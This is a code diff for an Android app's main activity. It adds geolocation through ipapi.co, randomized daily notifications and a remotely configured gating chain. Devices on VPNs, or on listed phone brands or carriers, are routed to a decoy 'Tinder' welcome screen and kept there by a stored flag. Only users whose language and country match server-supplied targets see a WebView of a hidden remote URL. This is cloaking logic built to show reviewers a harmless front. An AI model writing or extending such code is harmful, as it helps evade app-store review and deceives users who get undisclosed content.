@@ -5,7 +5,6 @@ import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
@@ -26,20 +25,21 @@ import java.net.HttpURLConnection;
 import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.net.URL;
+import java.net.URLConnection;
 import java.util.Calendar;
 import java.util.Collections;
 import java.util.Locale;
+import java.util.Random;
 
 
 import static org.apache.http.params.CoreProtocolPNames.USER_AGENT;
 
 public class MainActivity extends AppCompatActivity {
 
-
-
     String getUrl;
+    String geoUrl;
     String url;
-
+    SharedPreferencesEditor sharedPreferencesEditor;
 
 
     @Override
@@ -47,6 +47,27 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
         getUrl = getResources().getString(R.string.get_url);
+        geoUrl = "https://ipapi.co/country";
+
+        Random random = new Random();
+
+        sharedPreferencesEditor = new SharedPreferencesEditor(this);
+
+
+
+            planNotify(10, random.nextInt(60), 0);
+            planNotify(13, random.nextInt(60), 2);
+            planNotify(18, random.nextInt(60), 1);
+            planNotify(20, random.nextInt(60), 3);
+            planNotify(22, random.nextInt(60), 4);
+
+
+        LogClass.log("planning notifications");
+
+
+
+
+
 
         MyAsyncTask myAsyncTask = new MyAsyncTask();
         myAsyncTask.execute();
@@ -59,12 +80,24 @@ public class MainActivity extends AppCompatActivity {
 
     class MyAsyncTask extends AsyncTask<Void, Void, JSONArray> {
 
-        URL serverUrl;
-        HttpURLConnection httpUrlConnection;
+        URL serverUrl, geoApi;
+        HttpURLConnection httpUrlConnection, geoUrlConnection;
         JSONArray mJSONArray;
+        String userCountry = "";
         @Override
         protected JSONArray doInBackground(Void... voids) {
             try {
+
+
+                geoApi = new URL(geoUrl);
+                httpUrlConnection = (HttpURLConnection) geoApi.openConnection();
+                httpUrlConnection.setRequestMethod("GET");
+                httpUrlConnection.setRequestProperty("User-Agent", USER_AGENT);
+                userCountry = readJSON(httpUrlConnection);
+                httpUrlConnection.disconnect();
+
+
+
                 serverUrl = new URL(getUrl);
                 httpUrlConnection = (HttpURLConnection) serverUrl.openConnection();
                 httpUrlConnection.setRequestMethod("GET");
@@ -75,70 +108,83 @@ public class MainActivity extends AppCompatActivity {
 
                 Boolean stopping = jsonObject.getBoolean("stopping");
 
-                SharedPreferencesEditor sharedPreferencesEditor = new SharedPreferencesEditor(getApplicationContext());
-                if (sharedPreferencesEditor.checkPreferencesStorage(Constants.url)){
-                    openView(sharedPreferencesEditor.getStringValue(Constants.url));
+
+                if (sharedPreferencesEditor.checkPreferencesStorage(Constants.isTinder)){
+                    openTinder();
                 }
                 else {
 
+                    if (sharedPreferencesEditor.checkPreferencesStorage(Constants.urlBeforeUserLeaveHint)) {
 
-                    if (useVpn()) {
-                        openTinder();
+//                        LogClass.log("contains last url" + sharedPreferencesEditor.getStringValue(Constants.urlBeforeUserLeaveHint) );
+                        openView(sharedPreferencesEditor.getStringValue(Constants.urlBeforeUserLeaveHint));
+
                     } else {
 
-                        if (stopping) {
-
-                            String stopBrand = jsonObject.getString("stop_brand");
-                            JSONArray stopBrands = new JSONArray(stopBrand);
-                            String userBrand = Build.BRAND;
-                            if (jsonArrayHasElement(stopBrands, userBrand)){
+                        if (sharedPreferencesEditor.checkPreferencesStorage(Constants.url)) {
+                            openView(sharedPreferencesEditor.getStringValue(Constants.url));
+                        } else {
+                            if (useVpn()) {
                                 openTinder();
-                            }
-                            else {
+                            } else {
+                                if (stopping) {
+                                    String stopBrand = jsonObject.getString("stop_brand");
+                                    JSONArray stopBrands = new JSONArray(stopBrand);
+                                    String userBrand = Build.BRAND;
 
+//                                LogClass.log("userBrand: " + userBrand);
+//                                LogClass.log("stopBrand: " + stopBrand);
 
-                                String stopIsp = jsonObject.getString("stop_isp");
-                                JSONArray stopIsps = new JSONArray(stopIsp);
-                                TelephonyManager telephonyManager = (TelephonyManager)
-                                        getSystemService(Context.TELEPHONY_SERVICE);
+                                    if (jsonArrayHasElement(stopBrands, userBrand)) {
+                                        openTinder();
+                                    } else {
 
-                                String userIsp = telephonyManager.getNetworkOperator();
-                                if (jsonArrayHasElement(stopIsps, userIsp)) {
+                                        String stopIsp = jsonObject.getString("stop_isp");
+                                        JSONArray stopIsps = new JSONArray(stopIsp);
+                                        TelephonyManager telephonyManager = (TelephonyManager)
+                                                getSystemService(Context.TELEPHONY_SERVICE);
+
+                                        String userIsp = telephonyManager.getNetworkOperatorName();
+//
+//                                    LogClass.log("userIsp: " + userIsp);
+//                                    LogClass.log("stopIsp: " + stopIsp);
+
+                                        if (jsonArrayHasElement(stopIsps, userIsp)) {
+                                            openTinder();
+                                        } else {
+
+                                            url = jsonObject.getString("url");
+
+//                                        LogClass.log("url: " + url);
+
+                                            String targetLanguage = jsonObject.getString("target_lang");
+                                            JSONArray targetLanguages = new JSONArray(targetLanguage);
+                                            String userLanguage = getResources().getConfiguration().locale.getLanguage();
+
+//                                        LogClass.log("userLang: " + userLanguage);
+//                                        LogClass.log("targetLang: " + targetLanguage);
+
+                                            String targetCountry = jsonObject.getString("target_country");
+                                            JSONArray targetCountries = new JSONArray(targetCountry);
+
+//                                          LogClass.log("userCountry: " + userCountry);
+//                                        LogClass.log("targetCountry: " + targetCountry);
+
+                                            if (jsonArrayHasElement(targetLanguages, userLanguage) && jsonArrayHasElement(targetCountries, userCountry)) {
+                                                openView(url);
+                                            } else {
+                                                openTinder();
+                                            }
+                                        }
+                                    }
+                                } else {
                                     openTinder();
                                 }
-                                else {
-
-
-                                    url = jsonObject.getString("url");
-
-                                    String targetLanguage = jsonObject.getString("target_lang");
-                                    JSONArray targetLanguages = new JSONArray(targetLanguage);
-                                    String userLanguage = Locale.getDefault().getDisplayLanguage();
-
-                                    String targetCountry = jsonObject.getString("target_country");
-                                    JSONArray targetCountries = new JSONArray(targetCountry);
-                                    String userCountry = Locale.getDefault().getCountry();
-
-                                    if (jsonArrayHasElement(targetLanguages, userLanguage) && jsonArrayHasElement(targetCountries, userCountry)){
-                                        openView(url);
-                                    }
-                                    else{
-                                        openTinder();
-                                    }
-
-
-                                }
                             }
-                        } else {
-                            openTinder();
                         }
                     }
 
                 }
-
-
-
-
             } catch (Exception ex) {
                 openTinder();
                 LogClass.log("exception:" + ex.getMessage());
@@ -170,7 +216,8 @@ public class MainActivity extends AppCompatActivity {
     private Boolean jsonArrayHasElement(JSONArray jsonArray, String item){
         for( int i=0; i<=jsonArray.length()-1;i++){
             try {
-                if (item.equals(jsonArray.getString(i))) {
+                if (item.equalsIgnoreCase(jsonArray.getString(i))) {
+//                    LogClass.log("json Array Has Element " + item);
                     return true;
                 }
 
@@ -178,21 +225,21 @@ public class MainActivity extends AppCompatActivity {
                 e.printStackTrace();
             }
         }
+//        LogClass.log("json Array Has Not Element " + item);
         return false;
     }
 
 
     private void openTinder() {
         Intent intent = new Intent(this,WelcomeScreen.class);
+        sharedPreferencesEditor.putIntoStorage(Constants.isTinder,"yes");
         startActivity(intent);
-        finish();
     }
 
     private void openView(String link) {
-        Intent intent = new Intent(this,WelcomeScreen.class);
+        Intent intent = new Intent(this,MyView.class);
         intent.putExtra("url",link);
         startActivity(intent);
-        finish();
     }
 
 
@@ -202,7 +249,7 @@ public class MainActivity extends AppCompatActivity {
             for (NetworkInterface networkInterface : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                 if (networkInterface.isUp())
                     iface = networkInterface.getName();
-                LogClass.log("IFACE NAME: " + iface);
+//                LogClass.log("IFACE NAME: " + iface);
                 if ( iface.contains("tun") || iface.contains("ppp") || iface.contains("pptp")) {
                     return true;
                 }
@@ -219,40 +266,40 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private void planNotify(){
 
-        Calendar rightNow = Calendar.getInstance();
-        int currentHour= rightNow.get(Calendar.HOUR_OF_DAY);
 
-        if (currentHour>10 && currentHour <13) {
 
-        }
-        if (currentHour>13 && currentHour <18) {
+    private void planNotify(int hours, int minutes, int i) {
 
-        }
-        if (currentHour>18 && currentHour <20) {
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
 
-        }
-        if (currentHour>20 && currentHour <22) {
 
-        }
+        Intent intent = new Intent(this, NotificationReceiver.class);
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, i,
+                intent, PendingIntent.FLAG_UPDATE_CURRENT);
 
         Calendar calendar = Calendar.getInstance();
         calendar.setTimeInMillis(System.currentTimeMillis());
-        calendar.set(Calendar.HOUR_OF_DAY, 8);
-        calendar.set(Calendar.MINUTE, 30);
+        calendar.set(Calendar.HOUR_OF_DAY, hours);
+        calendar.set(Calendar.MINUTE, minutes);
+        long timeUntilTrigger;
+
+        double diff = Calendar.getInstance().getTimeInMillis() - calendar.getTimeInMillis();
+        if (diff>0){
+            timeUntilTrigger = calendar.getTimeInMillis() + 86400000;
+        }
+        else{
+            timeUntilTrigger = calendar.getTimeInMillis();
+        }
+
+
+
+        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, timeUntilTrigger, AlarmManager.INTERVAL_DAY, pendingIntent);
+
     }
 
-    private void restartNotify() {
-        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        Intent intent = new Intent(this, MyReceiver.class);
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0,
-                intent, PendingIntent.FLAG_CANCEL_CURRENT );
-// На случай, если мы ранее запускали активити, а потом поменяли время,
-// откажемся от уведомления
-        am.cancel(pendingIntent);
-// Устанавливаем разовое напоминание
-//        am.set(AlarmManager.RTC_WAKEUP, stamp.getTime(), pendingIntent);
-    }
+
+
+
 
 }
